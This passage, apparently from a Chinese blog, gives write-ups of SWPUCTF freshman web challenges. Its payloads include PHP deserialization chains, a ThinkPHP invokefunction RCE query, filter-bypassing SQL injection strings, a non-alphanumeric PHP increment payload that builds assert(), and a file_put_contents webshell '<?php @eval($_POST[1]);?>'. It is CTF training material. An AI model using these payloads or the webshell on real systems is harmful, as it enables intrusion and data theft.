  }<br>    <br>    <br>}<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'nss'</span>]);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></tbody></table></figure>
<p>简单的反序列化</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lyh</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$url</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lt</span> = <span class="hljs-string">'system'</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lly</span> = <span class="hljs-string">'cat${IFS}/flag'</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;lt;<br>        <span class="hljs-variable">$a</span>(<span class="hljs-variable language_">$this</span>-&gt;lly);<br>    }<br>}<br><span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lyh</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);<br><br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-comment">//O:3:"lyh":3:{s:3:"url";N;s:2:"lt";s:6:"system";s:3:"lly";s:14:"cat${IFS}/flag";}</span><br></code></pre></td></tr></tbody></table></figure>
<h1>[SWPUCTF 2022 新生赛]ez_rce</h1>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309153637104.png" alt="image-20240309153637104"></p>
<p>直接robots.txt找到对应路由，访问之后发现是thinkphp漏洞，直接payload打就行了</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars<span class="hljs-selector-attr">[0]</span>=system&amp;vars<span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[]</span>=cat /nss/ctf/flag/flag<br></code></pre></td></tr></tbody></table></figure>
<h1>[SWPUCTF 2022 新生赛]ez_ez_unserialize</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">X</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span> = <span class="hljs-keyword">__FILE__</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;x = <span class="hljs-variable">$x</span>;<br>    }<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;x !== <span class="hljs-keyword">__FILE__</span>) {<br>            <span class="hljs-variable language_">$this</span>-&gt;x = <span class="hljs-keyword">__FILE__</span>;<br>        }<br>    }<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>{<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;x);<br>        <span class="hljs-comment">//flag is in fllllllag.php</span><br>    }<br>}<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'x'</span>])) {<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'x'</span>]);<br>} <span class="hljs-keyword">else</span> {<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>简单的链子，绕过wakeup即可</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">X</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span> = <span class="hljs-string">'fllllllag.php'</span>;<br>}<br><span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">X</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//O:1:"X":1:{s:1:"x";s:13:"fllllllag.php";}</span><br>   <span class="hljs-comment">// 改为</span><br><span class="hljs-comment">//O:1:"X":3:{s:1:"x";s:13:"fllllllag.php";}</span><br></code></pre></td></tr></tbody></table></figure>
<h1>[SWPUCTF 2022 新生赛]where_am_i</h1>
<p>这道题没想到是社工学，虽然知道11位大概率是电话号。。。这里昨晚才反应过来，题目也提示过（我在哪）</p>
<p>根据wp，这里有图片地址，直接百度识图看看</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309160026069.png" alt="image-20240309160026069"></p>
<p>发现是成都山水间 古迹酒店，直接百度搜一手</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309160236384.png" alt="image-20240309160236384"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309160245118.png" alt="image-20240309160245118"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309160218939.png" alt="image-20240309160218939"></p>
<h1>[SWPUCTF 2022 新生赛]js_sign</h1>
<p>又是一个新知识，敲击码：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/misc/encode/communication/">通信领域常用编码 </a>，看了一下感觉挺简单，就是对号入座，接下来看源码</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309161511392.png" alt="image-20240309161511392"></p>
<p>解码得到：tapcode也就是tap code：敲击码，对应工具为：<a target="_blank" rel="noopener" href="http://www.hiencode.com/tapcode.html">http://www.hiencode.com/tapcode.html</a></p>
<p>接着将flag的值，中间空格去掉，放进去解密即可：NSSCTF{youfindflagbytapcode}</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309161604787.png" alt="image-20240309161604787"></p>
<h1>[SWPUCTF 2022 新生赛]xff</h1>
<p>修改xff以及referer头即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309161936041.png" alt="image-20240309161936041"></p>
<h1>[SWPUCTF 2022 新生赛]numgame</h1>
<p>发现查看源码、F12什么的都禁了，直接上bp抓一下</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309162236676.png" alt="image-20240309162236676"></p>
<p>发现多个可以js文件，访问一下，以为是flag，解码看看：NsScTf.php</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309162256195.png" alt="image-20240309162256195"></p>
<p>访问页面</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//hint: 与get相似的另一种请求协议是什么呢</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">nss</span></span>{<br>    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctf</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">"./hint2.php"</span>);<br>    }<br>}<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'p'</span>])){<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/n|c/m"</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'p'</span>], <span class="hljs-variable">$matches</span>))<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no"</span>);<br>    <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'p'</span>]);<br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>这道题感觉有点脑洞了，我想不到。。。这里第二个提示为：有没有可能类是nss2呢。</p>
<p>这里重点函数肯定是call_user_func了，搜一下用法</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309163418985.png" alt="image-20240309163418985"></p>
<p>当然也可以看这个</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309163438380.png" alt="image-20240309163438380"></p>
<p>也就是说我们可以通过这个函数调用某些方法，结合他说真正的类是nss2，而nss类中有一个ctf方法，那我们可以尝试</p>
<p><code>nss2::ctf</code>，当然再结合第一个提示说：与get类似的传参方式是什么呢？肯定是post了，说明需要post传参p</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309163556215.png" alt="image-20240309163556215"></p>
<p>最后查看源码即可</p>
<h1>[SWPUCTF 2022 新生赛]ez_sql</h1>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309163728434.png" alt="image-20240309163728434"></p>
<p>刚开始说让我们用相对安全的传参方式：肯定是post，接着我给nss随便传了个内容，发现两个fake flag。。。。</p>
<p>接着就是常规SQL手工注入了，这里不断fuzz发现过滤了order、union、空格，不过都可以双写绕过，后面的用内联注释绕过即可</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">nss=<span class="hljs-number">2</span>'<span class="hljs-comment">/**/</span>uunionnion<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span># <br><br>nss=<span class="hljs-number">2</span>'<span class="hljs-comment">/**/</span>uunionnion<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(table_name),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>infoorrmation_schema<span class="hljs-selector-class">.tables</span><span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_schema='NSS_db'#<br><br>nss=<span class="hljs-number">2</span>'<span class="hljs-comment">/**/</span>uunionnion<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(column_name),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>infoorrmation_schema<span class="hljs-selector-class">.columns</span><span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_name='NSS_tb'#<br><br>nss=<span class="hljs-number">2</span>'<span class="hljs-comment">/**/</span>uunionnion<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(Secr3t),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>NSS_tb#<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309165918346.png" alt="image-20240309165918346"></p>
<h1>[SWPUCTF 2022 新生赛]webdog1__start</h1>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309170643719.png" alt="image-20240309170643719"></p>
<p>看到源码有这一处地方，要求md5加密后等于自身，那找一个0e开头的字符串即可：?web=0e215962017</p>
<p>接着继续看源码，箭头处可以联想到robots.txt</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309170924979.png" alt="image-20240309170924979"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309170949358.png" alt="image-20240309170949358"></p>
<p>继续访问，看到响应包的提示，继续访问</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309171205453.png" alt="image-20240309171205453"></p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'get'</span>])){<br>    <span class="hljs-variable">$get</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'get'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get</span>,<span class="hljs-string">" "</span>)){<br>        <span class="hljs-variable">$get</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">"flag"</span>, <span class="hljs-string">" "</span>, <span class="hljs-variable">$get</span>);<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$get</span>)&gt;<span class="hljs-number">18</span>){<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">"This is too long."</span>);<br>            }<br>            <br>            <span class="hljs-keyword">else</span>{<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$get</span>);<br>          } <br>    }<span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"nonono"</span>); <br>    }<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">?get=<span class="hljs-built_in">eval</span>($_POST[a]);<br><span class="hljs-comment">//post</span><br><span class="hljs-selector-tag">a</span>=<span class="hljs-built_in">system</span>('cat /flag');<br><span class="hljs-comment">//也可以直接</span><br><span class="hljs-built_in">system</span>("nl%<span class="hljs-number">09</span>/*");<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309171612435.png" alt="image-20240309171612435"></p>
<h1>[SWPUCTF 2022 新生赛]funny_php</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>])){<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>])&lt;=<span class="hljs-number">3</span>&amp;&amp;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>]&gt;<span class="hljs-number">999999999</span>){<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">":D"</span>;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'L1'</span>] = <span class="hljs-number">1</span>;<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">":C"</span>;<br>        }<br>    }<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'str'</span>])){<br>        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/NSSCTF/'</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'str'</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$str</span> === <span class="hljs-string">"NSSCTF"</span>){<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"wow"</span>;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'L2'</span>] = <span class="hljs-number">1</span>;<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>        }<br>    }<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_1'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_2'</span>])){<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_1'</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_2'</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_1'</span>])==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_2'</span>])){<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Nice!"</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_1'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_2'</span>])){<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_1'</span>])&amp;&amp;<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_2'</span>])){<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">"yoxi!"</span>;<br>                    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'L3'</span>] = <span class="hljs-number">1</span>;<br>                }<span class="hljs-keyword">else</span>{<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">"X("</span>;<br>                }<br>            }<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"G"</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_1'</span>].<span class="hljs-string">"\n"</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_2'</span>];<br>        }<br>    }<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'L1'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'L2'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'L3'</span>])){<br>        <span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    }<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>第一个指数绕过、第二个双写绕过、第三个找字符串在md5加密后0e开头的即可</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">?num=<span class="hljs-number">9</span>e9&amp;str=NSSNSSCTFCTF<br>md5_1=s878926199a&amp;md5_2=s155964671a<br></code></pre></td></tr></tbody></table></figure>
<h1>[SWPUCTF 2021 新生赛]hardrce_3</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-Type:text/html;charset=utf-8"</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'wllm'</span>]))<br>{<br>    <span class="hljs-variable">$wllm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'wllm'</span>];<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">' '</span>,<span class="hljs-string">'\^'</span>,<span class="hljs-string">'\~'</span>,<span class="hljs-string">'\|'</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>)<br>    {<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/'</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">'/m'</span>, <span class="hljs-variable">$wllm</span>)) {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"小伙子只会异或和取反？不好意思哦LTLT说不能用！！"</span>);<br>    }}<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/[a-zA-Z0-9]/is'</span>,<span class="hljs-variable">$wllm</span>))<br>{<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Ra'sAlGhul说用字母数字是没有灵魂的！"</span>);<br>}<br><span class="hljs-keyword">echo</span> <span class="hljs-string">"NoVic4说：不错哦小伙子，可你能拿到flag吗？"</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$wllm</span>);<br>}<br><span class="hljs-keyword">else</span><br>{<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"蔡总说：注意审题！！！"</span>;<br>}<br><span class="hljs-meta">?&gt;</span> NoVic4说：不错哦小伙子，可你能拿到flag吗？<br></code></pre></td></tr></tbody></table></figure>
<p>这里吧取反、异或都过滤了，但我们可以用自增，固定格式如下：</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">$_=<span class="hljs-selector-attr">[]</span>;$_=@<span class="hljs-string">"$_"</span>;$_=$_<span class="hljs-selector-attr">[<span class="hljs-string">'!'</span>==<span class="hljs-string">'@'</span>]</span>;$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$<span class="hljs-built_in">___</span>($_[_]);<br>这是固定格式构造出来的 <span class="hljs-built_in">assert</span>($_POST[_]);<br>然后post传入 _=<span class="hljs-built_in">phpinfo</span>();<br>使用时需要url编码.<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309180110365.png" alt="image-20240309180110365"></p>
<p>可以看到过滤了很多命令执行函数，但没有过滤file_put_contents函数，我们直接写马即可</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">_=<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">'shell.php'</span>,<span class="hljs-string">'&lt;?php @eval($_POST[1]);?&gt;'</span>);<br></code></pre></td></tr></tbody></table></figure>
<p>之后蚁剑连接（这里开始一直报错，不知道为何，也不是代理啥的问题，结果等了一会儿突然又行了）</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240310154828298.png" alt="image-20240310154828298"></p>
<p>不过这里也可以用其他办法，但如果不是上述令写马的方式，则需要绕过disable_funtions限制</p>
<p>也可以用下面的绕过open_basedir的方法</p>
